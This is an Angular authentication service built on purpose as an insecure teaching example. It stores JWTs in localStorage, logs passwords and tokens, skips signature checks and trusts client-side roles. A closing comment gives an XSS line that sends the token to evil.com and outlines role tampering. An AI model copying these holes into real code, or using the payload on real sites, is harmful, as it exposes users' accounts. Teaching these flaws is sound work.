/**
 * VULNERABLE: Authentication Service
 *
 * Security Issues:
 * - A02: Cryptographic Failures (JWT in localStorage)
 * - A07: Identification and Authentication Failures
 *
 * This service demonstrates INSECURE authentication patterns.
 * JWT tokens stored in localStorage are accessible via XSS attacks.
 *
 * DO NOT USE IN PRODUCTION
 */

import { Injectable, signal } from '@angular/core';

interface User {
  id: string;
  email: string;
  role: string;
}

interface DecodedToken {
  sub: string;
  email: string;
  role: string;
  exp: number;
  iat: number;
}

@Injectable({
  providedIn: 'root'
})
export class VulnerableAuthService {
  // VULN: Using signals to expose auth state (can leak to devtools)
  private currentUserSignal = signal<User | null>(null);

  // VULN: Token storage key is predictable
  private readonly TOKEN_KEY = 'auth_token';
  private readonly USER_KEY = 'current_user';

  constructor() {
    // VULN: Auto-restore session from localStorage (XSS can steal this)
    this.restoreSession();
  }

  /**
   * VULNERABLE: Login and store token in localStorage
   * localStorage is accessible via JavaScript, making tokens vulnerable to XSS
   */
  login(email: string, password: string): boolean {
    // VULN: Simulated login - in real app this would call an API
    // Credentials are logged for "debugging"
    console.log('Login attempt:', { email, password }); // VULN: Logging credentials!

    // Simulate receiving a JWT from server
    const fakeToken = this.createFakeJwt(email);

    // VULN: Storing JWT in localStorage - accessible via XSS!
    localStorage.setItem(this.TOKEN_KEY, fakeToken);

    // VULN: Also storing user data in localStorage
    const user: User = {
      id: '12345',
      email: email,
      role: email.includes('admin') ? 'admin' : 'user'
    };
    localStorage.setItem(this.USER_KEY, JSON.stringify(user));

    this.currentUserSignal.set(user);

    // VULN: Logging successful login with sensitive data
    console.log('Login successful, token:', fakeToken);

    return true;
  }

  /**
   * VULNERABLE: Get token from localStorage
   */
  getToken(): string | null {
    // VULN: Any XSS can call this and steal the token
    return localStorage.getItem(this.TOKEN_KEY);
  }

  /**
   * VULNERABLE: Decode JWT without verification
   */
  decodeToken(): DecodedToken | null {
    const token = this.getToken();
    if (!token) return null;

    try {
      // VULN: Decoding without signature verification!
      // An attacker could forge a token with elevated privileges
      const parts = token.split('.');
      if (parts.length !== 3) return null;

      const payload = JSON.parse(atob(parts[1]));
      return payload;
    } catch {
      return null;
    }
  }

  /**
   * VULNERABLE: Check if user is admin without proper verification
   */
  isAdmin(): boolean {
    const decoded = this.decodeToken();
    // VULN: Trusting the role from decoded token without server verification
    return decoded?.role === 'admin';
  }

  /**
   * VULNERABLE: Check authentication status
   */
  isAuthenticated(): boolean {
    const token = this.getToken();
    if (!token) return false;

    const decoded = this.decodeToken();
    if (!decoded) return false;

    // VULN: Only checking expiration, not signature!
    const now = Math.floor(Date.now() / 1000);
    return decoded.exp > now;
  }

  /**
   * VULNERABLE: Logout doesn't invalidate server session
   */
  logout(): void {
    // VULN: Only clearing client-side storage
    // Server session (if any) remains valid
    localStorage.removeItem(this.TOKEN_KEY);
    localStorage.removeItem(this.USER_KEY);
    this.currentUserSignal.set(null);

    // VULN: Not notifying server of logout
    console.log('Logged out locally, server session may still be valid');
  }

  /**
   * Get current user (exposed via signal)
   */
  getCurrentUser(): User | null {
    return this.currentUserSignal();
  }

  /**
   * VULNERABLE: Restore session from localStorage on page load
   */
  private restoreSession(): void {
    const userJson = localStorage.getItem(this.USER_KEY);
    if (userJson) {
      try {
        // VULN: Trusting data from localStorage without verification
        const user = JSON.parse(userJson);
        this.currentUserSignal.set(user);
        console.log('Session restored from localStorage');
      } catch {
        // Ignore parse errors
      }
    }
  }

  /**
   * Create a fake JWT for demonstration
   * In a real app, this would come from the server
   */
  private createFakeJwt(email: string): string {
    const header = { alg: 'HS256', typ: 'JWT' };
    const payload = {
      sub: '12345',
      email: email,
      role: email.includes('admin') ? 'admin' : 'user',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 3600 // 1 hour
    };

    // VULN: Creating JWT client-side (for demo only)
    const headerB64 = btoa(JSON.stringify(header));
    const payloadB64 = btoa(JSON.stringify(payload));
    const signature = 'fake-signature'; // Obviously insecure

    return `${headerB64}.${payloadB64}.${signature}`;
  }
}

/**
 * ATTACK SCENARIOS:
 *
 * 1. XSS Token Theft:
 *    - Attacker injects: <script>fetch('https://evil.com/steal?token='+localStorage.getItem('auth_token'))</script>
 *    - Token is sent to attacker's server
 *    - Attacker can now impersonate the user
 *
 * 2. Privilege Escalation:
 *    - Attacker decodes JWT: atob(token.split('.')[1])
 *    - Modifies role: {"role": "admin"}
 *    - Re-encodes and replaces token
 *    - If server doesn't verify signature, attacker is now admin
 *
 * 3. Session Fixation:
 *    - Attacker sets a known token in victim's browser
 *    - Victim logs in, token is associated with attacker's session
 *    - Attacker can now access victim's session
 */
